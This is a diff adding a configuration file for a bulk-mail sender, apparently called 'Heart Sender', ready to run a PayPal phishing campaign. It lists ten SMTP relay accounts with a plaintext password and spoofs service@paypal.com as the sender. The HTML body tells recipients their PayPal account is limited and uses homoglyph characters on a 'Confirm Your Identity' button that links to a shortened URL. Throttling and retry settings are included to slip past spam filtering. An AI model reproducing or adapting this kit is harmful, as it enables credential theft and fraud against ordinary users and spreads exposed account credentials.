@@ -1,0 +1,797 @@
+# HEART SENDER CONFIGURATION
+# SAVED AT : 06/01/2018 21:43:29
+
+[SMTP]
+smtp-relay.gmail.com|587|Y|Y|service1@requestedthroughs-gateway.org|@Dancok123|0
+smtp-relay.gmail.com|587|Y|Y|service2@requestedthroughs-gateway.org|@Dancok123|1
+smtp-relay.gmail.com|587|Y|Y|service3@requestedthroughs-gateway.org|@Dancok123|2
+smtp-relay.gmail.com|587|Y|Y|service4@requestedthroughs-gateway.org|@Dancok123|3
+smtp-relay.gmail.com|587|Y|Y|service5@requestedthroughs-gateway.org|@Dancok123|4
+smtp-relay.gmail.com|587|Y|Y|service6@requestedthroughs-gateway.org|@Dancok123|5
+smtp-relay.gmail.com|587|Y|Y|service7@requestedthroughs-gateway.org|@Dancok123|6
+smtp-relay.gmail.com|587|Y|Y|service8@requestedthroughs-gateway.org|@Dancok123|7
+smtp-relay.gmail.com|587|Y|Y|service9@requestedthroughs-gateway.org|@Dancok123|8
+smtp-relay.gmail.com|587|Y|Y|service10@requestedthroughs-gateway.org|@Dancok123|9
+[/SMTP]
+
+[FROMSUBJECT]
+[Important] - Your account PayPal has been limited. Please update your account PayPal. [ 06 Dec 2018 ]
+[/FROMSUBJECT]
+
+[FROMNAME]
+service@paypal.com
+[/FROMNAME]
+
+[FROMMAIL]
+service-accountpaypal##random_letterupp_10##@##random_letterupp_10##.centre.com
+[/FROMMAIL]
+
+[ISHTML]
+TRUE
+[/ISHTML]
+
+[HEART_MAIL_MESSAGE]
+<!doctype html>
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
+	<head>
+		<!-- NAME: FOLLOW UP -->
+		<!--[if gte mso 15]>
+		<xml>
+			<o:OfficeDocumentSettings>
+			<o:AllowPNG/>
+			<o:PixelsPerInch>96</o:PixelsPerInch>
+			</o:OfficeDocumentSettings>
+		</xml>
+		<![endif]-->
+		<meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+		<title>*|MC:SUBJECT|*</title>
+        
+    <style type="text/css">
+		p{
+			margin:10px 0;
+			padding:0;
+		}
+		table{
+			border-collapse:collapse;
+		}
+		h1,h2,h3,h4,h5,h6{
+			display:block;
+			margin:0;
+			padding:0;
+		}
+		img,a img{
+			border:0;
+			height:auto;
+			outline:none;
+			text-decoration:none;
+		}
+		body,#bodyTable,#bodyCell{
+			height:100%;
+			margin:0;
+			padding:0;
+			width:100%;
+		}
+		.mcnPreviewText{
+			display:none !important;
+		}
+		#outlook a{
+			padding:0;
+		}
+		img{
+			-ms-interpolation-mode:bicubic;
+		}
+		table{
+			mso-table-lspace:0pt;
+			mso-table-rspace:0pt;
+		}
+		.ReadMsgBody{
+			width:100%;
+		}
+		.ExternalClass{
+			width:100%;
+		}
+		p,a,li,td,blockquote{
+			mso-line-height-rule:exactly;
+		}
+		a[href^=tel],a[href^=sms]{
+			color:inherit;
+			cursor:default;
+			text-decoration:none;
+		}
+		p,a,li,td,body,table,blockquote{
+			-ms-text-size-adjust:100%;
+			-webkit-text-size-adjust:100%;
+		}
+		.ExternalClass,.ExternalClass p,.ExternalClass td,.ExternalClass div,.ExternalClass span,.ExternalClass font{
+			line-height:100%;
+		}
+		a[x-apple-data-detectors]{
+			color:inherit !important;
+			text-decoration:none !important;
+			font-size:inherit !important;
+			font-family:inherit !important;
+			font-weight:inherit !important;
+			line-height:inherit !important;
+		}
+		.templateContainer{
+			max-width:600px !important;
+		}
+		a.mcnButton{
+			display:block;
+		}
+		.mcnImage{
+			vertical-align:bottom;
+		}
+		.mcnTextContent{
+			word-break:break-word;
+		}
+		.mcnTextContent img{
+			height:auto !important;
+		}
+		.mcnDividerBlock{
+			table-layout:fixed !important;
+		}
+	/*
+	@tab Page
+	@section Heading 1
+	@style heading 1
+	*/
+		h1{
+			/*@editable*/color:#222222;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:40px;
+			/*@editable*/font-style:normal;
+			/*@editable*/font-weight:bold;
+			/*@editable*/line-height:150%;
+			/*@editable*/letter-spacing:normal;
+			/*@editable*/text-align:center;
+		}
+	/*
+	@tab Page
+	@section Heading 2
+	@style heading 2
+	*/
+		h2{
+			/*@editable*/color:#222222;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:34px;
+			/*@editable*/font-style:normal;
+			/*@editable*/font-weight:bold;
+			/*@editable*/line-height:150%;
+			/*@editable*/letter-spacing:normal;
+			/*@editable*/text-align:left;
+		}
+	/*
+	@tab Page
+	@section Heading 3
+	@style heading 3
+	*/
+		h3{
+			/*@editable*/color:#444444;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:22px;
+			/*@editable*/font-style:normal;
+			/*@editable*/font-weight:bold;
+			/*@editable*/line-height:150%;
+			/*@editable*/letter-spacing:normal;
+			/*@editable*/text-align:center;
+		}
+	/*
+	@tab Page
+	@section Heading 4
+	@style heading 4
+	*/
+		h4{
+			/*@editable*/color:#999999;
+			/*@editable*/font-family:Georgia;
+			/*@editable*/font-size:20px;
+			/*@editable*/font-style:italic;
+			/*@editable*/font-weight:normal;
+			/*@editable*/line-height:125%;
+			/*@editable*/letter-spacing:normal;
+			/*@editable*/text-align:left;
+		}
+	/*
+	@tab Header
+	@section Header Container Style
+	*/
+		#templateHeader{
+			/*@editable*/background-color:#ffffff;
+			/*@editable*/background-image:none;
+			/*@editable*/background-repeat:no-repeat;
+			/*@editable*/background-position:center;
+			/*@editable*/background-size:cover;
+			/*@editable*/border-top:0;
+			/*@editable*/border-bottom:0;
+			/*@editable*/padding-top:54px;
+			/*@editable*/padding-bottom:54px;
+		}
+	/*
+	@tab Header
+	@section Header Interior Style
+	*/
+		.headerContainer{
+			/*@editable*/background-color:transparent;
+			/*@editable*/background-image:none;
+			/*@editable*/background-repeat:no-repeat;
+			/*@editable*/background-position:center;
+			/*@editable*/background-size:cover;
+			/*@editable*/border-top:0;
+			/*@editable*/border-bottom:0;
+			/*@editable*/padding-top:0;
+			/*@editable*/padding-bottom:0;
+		}
+	/*
+	@tab Header
+	@section Header Text
+	*/
+		.headerContainer .mcnTextContent,.headerContainer .mcnTextContent p{
+			/*@editable*/color:#808080;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:16px;
+			/*@editable*/line-height:150%;
+			/*@editable*/text-align:left;
+		}
+	/*
+	@tab Header
+	@section Header Link
+	*/
+		.headerContainer .mcnTextContent a,.headerContainer .mcnTextContent p a{
+			/*@editable*/color:#00ADD8;
+			/*@editable*/font-weight:normal;
+			/*@editable*/text-decoration:underline;
+		}
+	/*
+	@tab Body
+	@section Body Container Style
+	*/
+		#templateBody{
+			/*@editable*/background-color:#FFFFFF;
+			/*@editable*/background-image:none;
+			/*@editable*/background-repeat:no-repeat;
+			/*@editable*/background-position:center;
+			/*@editable*/background-size:cover;
+			/*@editable*/border-top:0;
+			/*@editable*/border-bottom:0;
+			/*@editable*/padding-top:0px;
+			/*@editable*/padding-bottom:0px;
+		}
+	/*
+	@tab Body
+	@section Body Interior Style
+	*/
+		.bodyContainer{
+			/*@editable*/background-color:transparent;
+			/*@editable*/background-image:none;
+			/*@editable*/background-repeat:no-repeat;
+			/*@editable*/background-position:center;
+			/*@editable*/background-size:cover;
+			/*@editable*/border-top:0;
+			/*@editable*/border-bottom:0;
+			/*@editable*/padding-top:0;
+			/*@editable*/padding-bottom:0;
+		}
+	/*
+	@tab Body
+	@section Body Text
+	*/
+		.bodyContainer .mcnTextContent,.bodyContainer .mcnTextContent p{
+			/*@editable*/color:#808080;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:16px;
+			/*@editable*/line-height:150%;
+			/*@editable*/text-align:left;
+		}
+	/*
+	@tab Body
+	@section Body Link
+	*/
+		.bodyContainer .mcnTextContent a,.bodyContainer .mcnTextContent p a{
+			/*@editable*/color:#00ADD8;
+			/*@editable*/font-weight:normal;
+			/*@editable*/text-decoration:underline;
+		}
+	/*
+	@tab Footer
+	@section Footer Style
+	*/
+		#templateFooter{
+			/*@editable*/background-color:#ffffff;
+			/*@editable*/background-image:none;
+			/*@editable*/background-repeat:no-repeat;
+			/*@editable*/background-position:center;
+			/*@editable*/background-size:cover;
+			/*@editable*/border-top:0;
+			/*@editable*/border-bottom:0;
+			/*@editable*/padding-top:0px;
+			/*@editable*/padding-bottom:0px;
+		}
+	/*
+	@tab Footer
+	@section Footer Interior Style
+	*/
+		.footerContainer{
+			/*@editable*/background-color:transparent;
+			/*@editable*/background-image:none;
+			/*@editable*/background-repeat:no-repeat;
+			/*@editable*/background-position:center;
+			/*@editable*/background-size:cover;
+			/*@editable*/border-top:0;
+			/*@editable*/border-bottom:0;
+			/*@editable*/padding-top:0;
+			/*@editable*/padding-bottom:0;
+		}
+	/*
+	@tab Footer
+	@section Footer Text
+	*/
+		.footerContainer .mcnTextContent,.footerContainer .mcnTextContent p{
+			/*@editable*/color:#FFFFFF;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:12px;
+			/*@editable*/line-height:150%;
+			/*@editable*/text-align:center;
+		}
+	/*
+	@tab Footer
+	@section Footer Link
+	*/
+		.footerContainer .mcnTextContent a,.footerContainer .mcnTextContent p a{
+			/*@editable*/color:#FFFFFF;
+			/*@editable*/font-weight:normal;
+			/*@editable*/text-decoration:underline;
+		}
+	@media only screen and (min-width:768px){
+		.templateContainer{
+			width:600px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		body,table,td,p,a,li,blockquote{
+			-webkit-text-size-adjust:none !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		body{
+			width:100% !important;
+			min-width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImage{
+			width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnCartContainer,.mcnCaptionTopContent,.mcnRecContentContainer,.mcnCaptionBottomContent,.mcnTextContentContainer,.mcnBoxedTextContentContainer,.mcnImageGroupContentContainer,.mcnCaptionLeftTextContentContainer,.mcnCaptionRightTextContentContainer,.mcnCaptionLeftImageContentContainer,.mcnCaptionRightImageContentContainer,.mcnImageCardLeftTextContentContainer,.mcnImageCardRightTextContentContainer,.mcnImageCardLeftImageContentContainer,.mcnImageCardRightImageContentContainer{
+			max-width:100% !important;
+			width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnBoxedTextContentContainer{
+			min-width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageGroupContent{
+			padding:9px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnCaptionLeftContentOuter .mcnTextContent,.mcnCaptionRightContentOuter .mcnTextContent{
+			padding-top:9px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageCardTopImageContent,.mcnCaptionBottomContent:last-child .mcnCaptionBottomImageContent,.mcnCaptionBlockInner .mcnCaptionTopContent:last-child .mcnTextContent{
+			padding-top:18px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageCardBottomImageContent{
+			padding-bottom:9px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageGroupBlockInner{
+			padding-top:0 !important;
+			padding-bottom:0 !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageGroupBlockOuter{
+			padding-top:9px !important;
+			padding-bottom:9px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnTextContent,.mcnBoxedTextContentColumn{
+			padding-right:18px !important;
+			padding-left:18px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageCardLeftImageContent,.mcnImageCardRightImageContent{
+			padding-right:18px !important;
+			padding-bottom:0 !important;
+			padding-left:18px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcpreview-image-uploader{
+			display:none !important;
+			width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Heading 1
+	@tip Make the first-level headings larger in size for better readability on small screens.
+	*/
+		h1{
+			/*@editable*/font-size:30px !important;
+			/*@editable*/line-height:125% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Heading 2
+	@tip Make the second-level headings larger in size for better readability on small screens.
+	*/
+		h2{
+			/*@editable*/font-size:26px !important;
+			/*@editable*/line-height:125% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Heading 3
+	@tip Make the third-level headings larger in size for better readability on small screens.
+	*/
+		h3{
+			/*@editable*/font-size:20px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Heading 4
+	@tip Make the fourth-level headings larger in size for better readability on small screens.
+	*/
+		h4{
+			/*@editable*/font-size:18px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Boxed Text
+	@tip Make the boxed text larger in size for better readability on small screens. We recommend a font size of at least 16px.
+	*/
+		.mcnBoxedTextContentContainer .mcnTextContent,.mcnBoxedTextContentContainer .mcnTextContent p{
+			/*@editable*/font-size:14px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Header Text
+	@tip Make the header text larger in size for better readability on small screens.
+	*/
+		.headerContainer .mcnTextContent,.headerContainer .mcnTextContent p{
+			/*@editable*/font-size:16px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Body Text
+	@tip Make the body text larger in size for better readability on small screens. We recommend a font size of at least 16px.
+	*/
+		.bodyContainer .mcnTextContent,.bodyContainer .mcnTextContent p{
+			/*@editable*/font-size:16px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Footer Text
+	@tip Make the footer content text larger in size for better readability on small screens.
+	*/
+		.footerContainer .mcnTextContent,.footerContainer .mcnTextContent p{
+			/*@editable*/font-size:14px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}</style></head>
+    <body>
+		<!--*|IF:MC_PREVIEW_TEXT|*-->
+		<!--[if !gte mso 9]><!----><span class="mcnPreviewText" style="display:none; font-size:0px; line-height:0px; max-height:0px; max-width:0px; opacity:0; overflow:hidden; visibility:hidden; mso-hide:all;">Reminder Update !</span><!--<![endif]-->
+		<!--*|END:IF|*-->
+        <center>
+            <table align="center" border="0" cellpadding="0" cellspacing="0" height="100%" width="100%" id="bodyTable">
+                <tr>
+                    <td align="center" valign="top" id="bodyCell">
+                        <!-- BEGIN TEMPLATE // -->
+                        <table border="0" cellpadding="0" cellspacing="0" width="100%">
+							<tr>
+								<td align="center" valign="top" id="templateHeader" data-template-container>
+									<!--[if (gte mso 9)|(IE)]>
+									<table align="center" border="0" cellspacing="0" cellpadding="0" width="600" style="width:600px;">
+									<tr>
+									<td align="center" valign="top" width="600" style="width:600px;">
+									<![endif]-->
+									<table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" class="templateContainer">
+										<tr>
+                                			<td valign="top" class="headerContainer"><table class="mcnImageBlock" style="min-width:100%;" width="100%" cellspacing="0" cellpadding="0" border="0">
+    <tbody class="mcnImageBlockOuter">
+            <tr>
+                <td style="padding:9px" class="mcnImageBlockInner" valign="top">
+                    <table class="mcnImageContentContainer" style="min-width:100%;" width="100%" cellspacing="0" cellpadding="0" border="0" align="left">
+                        <tbody><tr>
+                            <td class="mcnImageContent" style="padding-right: 9px; padding-left: 9px; padding-top: 0; padding-bottom: 0;" valign="top">
+                                
+                                    
+                                        <img alt="" src="https://gallery.mailchimp.com/39679bec9876267ffb912f08c/images/bbc51494-4f00-4241-afeb-f0744e6d4814.gif" style="max-width:90px; padding-bottom: 0; display: inline !important; vertical-align: bottom;" class="mcnImage" width="90" align="left">
+                                    
+                                
+                            </td>
+                        </tr>
+                    </tbody></table>
+                </td>
+            </tr>
+    </tbody>
+</table></td>
+										</tr>
+									</table>
+									<!--[if (gte mso 9)|(IE)]>
+									</td>
+									</tr>
+									</table>
+									<![endif]-->
+								</td>
+                            </tr>
+							<tr>
+								<td align="center" valign="top" id="templateBody" data-template-container>
+									<!--[if (gte mso 9)|(IE)]>
+									<table align="center" border="0" cellspacing="0" cellpadding="0" width="600" style="width:600px;">
+									<tr>
+									<td align="center" valign="top" width="600" style="width:600px;">
+									<![endif]-->
+									<table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" class="templateContainer">
+										<tr>
+                                			<td valign="top" class="bodyContainer"><table class="mcnTextBlock" style="min-width:100%;" width="100%" cellspacing="0" cellpadding="0" border="0">
+    <tbody class="mcnTextBlockOuter">
+        <tr>
+            <td class="mcnTextBlockInner" style="padding-top:9px;" valign="top">
+              	<!--[if mso]>
+				<table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;">
+				<tr>
+				<![endif]-->
+			    
+				<!--[if mso]>
+				<td valign="top" width="600" style="width:600px;">
+				<![endif]-->
+                <table style="max-width:100%; min-width:100%;" class="mcnTextContentContainer" width="100%" cellspacing="0" cellpadding="0" border="0" align="left">
+                    <tbody><tr>
+                        
+                        <td class="mcnTextContent" style="padding-top:0; padding-right:18px; padding-bottom:9px; padding-left:18px;" valign="top">
+                        
+                            <table id="x_emailWrapperTable" width="580" cellspacing="0" cellpadding="0" border="0">
+	<tbody>
+		<tr valign="top">
+			<td colspan="3">
+			<table width="100%" cellspacing="0" cellpadding="0" border="0">
+				<tbody>
+					<tr>
+						<td>&nbsp;</td>
+					</tr>
+				</tbody>
+			</table>
+			</td>
+		</tr>
+		<tr>
+			<td colspan="3"><img alt="" data-imagetype="External" src="https://www.paypalobjects.com/en_US/i/scr/scr_emailTopCorners_580wx13h.gif" style="vertical-align:bottom" height="13" border="0"></td>
+		</tr>
+		<tr>
+			<td style="background:url(/i/scr/scr_emailLeftBorder_13wx1h.gif) left repeat-y; border-left:1px solid #ddd" width="12"><img alt="" data-imagetype="External" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" border="0"></td>
+			<td class="x_contentArea" style="width:530px; word-wrap:break-word; padding:12px; margin:0" width="530">
+			<table width="100%">
+				<tbody>
+					<tr>
+						<td>
+						<p>Dear ##email##,</p>
+
+						<p>Remember, you still need to take action to restore your PayPal account. Until you do, your access is limited.</p>
+
+						<p><strong>What's going on?</strong></p>
+
+						<p>We noticed some unusual activity on your PayPal account and are concerned about potential unauthorized account access.&nbsp;</p>
+
+						<p><strong>What to do next</strong></p>
+
+						<p>Please log in to your PayPal account and complete the steps to confirm your identity and recent account activity. To help protect your account, access will remain limited. In addition, you will not be able to send or receive money until you complete the necessary steps.</p>
+
+						<table width="494" cellspacing="0" cellpadding="0" border="0">
+							<tbody>
+								<tr>
+								</tr>
+							</tbody>
+						</table>
+
+						<table width="155" height="106" cellspacing="0" cellpadding="0" border="0">
+							<tbody>
+								<tr>
+									<td style="border-left: 0px solid #A5A5A5;line-height: 27px;background: #FFFFFF;border-right: 0px solid #A5A5A5;" width="492">
+									<table width="156" height="36" cellspacing="0" cellpadding="0" border="0" align="left">
+										<tbody>
+											<tr>
+												<td height="1"><span style="font-size:14px"><img alt="" src="https://www.paypalobjects.com/webstatic/eCAT/GCE/spacer10.gif" style="display: block;" height="1" border="0"></span></td>
+											</tr>
+											<tr>
+												<td>
+												<table cellspacing="0" cellpadding="0" border="0">
+													<tbody>
+														<tr>
+															<td width="1" height="30"><span style="font-size:14px"><img alt="" src="https://www.paypalobjects.com/webstatic/eCAT/GCE/spacer10.gif" style="display: block;" width="1" height="30" border="0"></span></td>
+															<td style="font-size: 1em;font-family: helveticaneuelight, helveticaneue-light, &quot;helvetica neue light&quot;, helveticaneue, helvetica, arial, sans-serif;background: #0079C1;font-weight: 300;color: #FFFFFF;padding: 7px 15px;text-align: center;margin: 0px auto 16px;line-height: 1.45em;border-radius: 7px;" valign="middle" align="left"><span style="font-size:14px"><a href="http://bit.ly/2CN5OID" style="font-size: 13px;text-decoration: none;font-family: arial, sans-serif;font-weight: bold;color: #FFFFFF;display: block;line-height: 15px;"><strong style="color:#FFFFFF; display:block; font-family:arial,sans-serif; font-size:12px; font-weight:bold; line-height:15px; text-decoration:none">Сοnfігm Υοuг Idеntіtу</strong></a></span></td>
+														</tr>
+													</tbody>
+												</table>
+												</td>
+											</tr>
+										</tbody>
+									</table>
+									</td>
+								</tr>
+							</tbody>
+						</table>
+
+						<p>The security of your PayPal account is a top priority for us and we want to work together to help protect it.&nbsp;</p>
+
+						<p>&nbsp;</p>
+
+						<p>&nbsp;</p>
+
+						<p>Sincerely,</p>
+
+						<p>PayPal</p>
+
+						<p>&nbsp;</p>
+						</td>
+					</tr>
+				</tbody>
+			</table>
+			</td>
+			<td style="background:url(/i/scr/scr_emailRightBorder_13wx1h.gif) left repeat-y; border-right:1px solid #ddd" width="12"><img alt="" data-imagetype="External" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" border="0"></td>
+		</tr>
+		<tr>
+			<td colspan="3"><img alt="" data-imagetype="External" src="https://www.paypalobjects.com/en_US/i/scr/scr_emailBottomCorners_580wx13h.gif" height="13" border="0">
+			<p class="x_footerLink"><a href="https://www.paypal.com/selfhelp/home?ppid=PPC000263&amp;cnac=US&amp;rsta=en_US(en_US)&amp;cust=SXZWYF2JGPFY2&amp;unptid=e367cf8e-9c3f-11e7-a0a0-8cdcd4b6ee30&amp;t=&amp;cal=93f990a3e4696&amp;calc=93f990a3e4696&amp;calf=93f990a3e4696&amp;unp_tpcid=null&amp;page=main:email&amp;pgrp=main:email&amp;e=op&amp;mchn=em&amp;s=ci&amp;mail=sys" rel="noopener noreferrer" style="text-decoration:none" target="_blank">Help Center</a> | <a href="https://www.paypal.com/us/cgi-bin/webscr?cmd=_complaint-view&amp;ppid=PPC000263&amp;cnac=US&amp;rsta=en_US(en_US)&amp;cust=SXZWYF2JGPFY2&amp;unptid=e367cf8e-9c3f-11e7-a0a0-8cdcd4b6ee30&amp;t=&amp;cal=93f990a3e4696&amp;calc=93f990a3e4696&amp;calf=93f990a3e4696&amp;unp_tpcid=null&amp;page=main:email&amp;pgrp=main:email&amp;e=op&amp;mchn=em&amp;s=ci&amp;mail=sys" rel="noopener noreferrer" style="text-decoration:none" target="_blank">Resolution Center</a> | <a href="https://www.paypal.com/webapps/mpp/paypal-safety-and-security?ppid=PPC000263&amp;cnac=US&amp;rsta=en_US(en_US)&amp;cust=SXZWYF2JGPFY2&amp;unptid=e367cf8e-9c3f-11e7-a0a0-8cdcd4b6ee30&amp;t=&amp;cal=93f990a3e4696&amp;calc=93f990a3e4696&amp;calf=93f990a3e4696&amp;unp_tpcid=null&amp;page=main:email&amp;pgrp=main:email&amp;e=op&amp;mchn=em&amp;s=ci&amp;mail=sys" rel="noopener noreferrer" style="text-decoration:none" target="_blank">Security Center</a></p>
+			</td>
+		</tr>
+	</tbody>
+</table>
+
+                        </td>
+                    </tr>
+                </tbody></table>
+				<!--[if mso]>
+				</td>
+				<![endif]-->
+                
+				<!--[if mso]>
+				</tr>
+				</table>
+				<![endif]-->
+            </td>
+        </tr>
+    </tbody>
+</table></td>
+										</tr>
+									</table>
+									<!--[if (gte mso 9)|(IE)]>
+									</td>
+									</tr>
+									</table>
+									<![endif]-->
+								</td>
+                            </tr>
+                            <tr>
+								<td align="center" valign="top" id="templateFooter" data-template-container>
+									<!--[if (gte mso 9)|(IE)]>
+									<table align="center" border="0" cellspacing="0" cellpadding="0" width="600" style="width:600px;">
+									<tr>
+									<td align="center" valign="top" width="600" style="width:600px;">
+									<![endif]-->
+									<table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" class="templateContainer">
+										<tr>
+                                			<td valign="top" class="footerContainer"><table class="mcnTextBlock" style="min-width:100%;" width="100%" cellspacing="0" cellpadding="0" border="0">
+    <tbody class="mcnTextBlockOuter">
+        <tr>
+            <td class="mcnTextBlockInner" style="padding-top:9px;" valign="top">
+              	<!--[if mso]>
+				<table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;">
+				<tr>
+				<![endif]-->
+			    
+				<!--[if mso]>
+				<td valign="top" width="600" style="width:600px;">
+				<![endif]-->
+                <table style="max-width:100%; min-width:100%;" class="mcnTextContentContainer" width="100%" cellspacing="0" cellpadding="0" border="0" align="left">
+                    <tbody><tr>
+                        
+                        <td class="mcnTextContent" style="padding-top:0; padding-right:18px; padding-bottom:9px; padding-left:18px;" valign="top">
+                        
+                            <p style="text-align: left;"><span style="color:#000000">Copyright © 1999-2017 PayPal, Inc. All rights reserved. PayPal is located at 2211 N. First St., San Jose, CA 95131.</span></p>
+
+<p class="x_footer x_ppid" style="text-align: left;"><span style="color:#000000">PayPal PPC000263:93f990a3e4696</span></p>
+
+                        </td>
+                    </tr>
+                </tbody></table>
+				<!--[if mso]>
+				</td>
+				<![endif]-->
+                
+				<!--[if mso]>
+				</tr>
+				</table>
+				<![endif]-->
+            </td>
+        </tr>
+    </tbody>
+</table></td>
+										</tr>
+									</table>
+									<!--[if (gte mso 9)|(IE)]>
+									</td>
+									</tr>
+									</table>
+									<![endif]-->
+								</td>
+                            </tr>
+                        </table>
+                        <!-- // END TEMPLATE -->
+                    </td>
+                </tr>
+            </table>
+        </center>
+    </body>
+</html>
+[/HEART_MAIL_MESSAGE]
+
+[CONNECTION]
+1
+[/CONNECTION]
+
+[PAUSEEVERY]
+100
+[/PAUSEEVERY]
+
+[LONGSLEEP]
+3
+[/LONGSLEEP]
+
+[MAILPRIORITY]
+0
+[/MAILPRIORITY]
+
+[ISRETRYFAILED]
+TRUE
+[/ISRETRYFAILED]
+
+[RETRYFAILED]
+1
+[/RETRYFAILED]
